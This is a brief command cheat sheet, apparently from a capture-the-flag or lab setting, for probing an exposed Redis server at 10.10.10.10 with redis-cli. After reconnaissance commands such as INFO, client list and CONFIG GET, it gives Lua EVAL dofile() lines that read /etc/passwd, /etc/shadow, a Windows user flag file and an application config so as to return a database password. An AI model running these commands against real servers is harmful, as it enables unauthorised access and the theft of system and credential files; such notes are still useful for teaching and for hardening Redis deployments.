```bash
redis-cli -h 10.10.10.10 # sudo apt-get install redis-tools

# Redis response with info 
INFO

# Redis response with connected clients
client list

# Get config
CONFIG GET *

get user
# if get 'nil' user key doesn't exist

SET user varun

EVAL dofile('/etc/passwd') 0
EVAL dofile('/etc/shadow') 0

eval "dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt')" 0

EVAL dofile('/var/data/app/db.conf');return(db.passwd);
```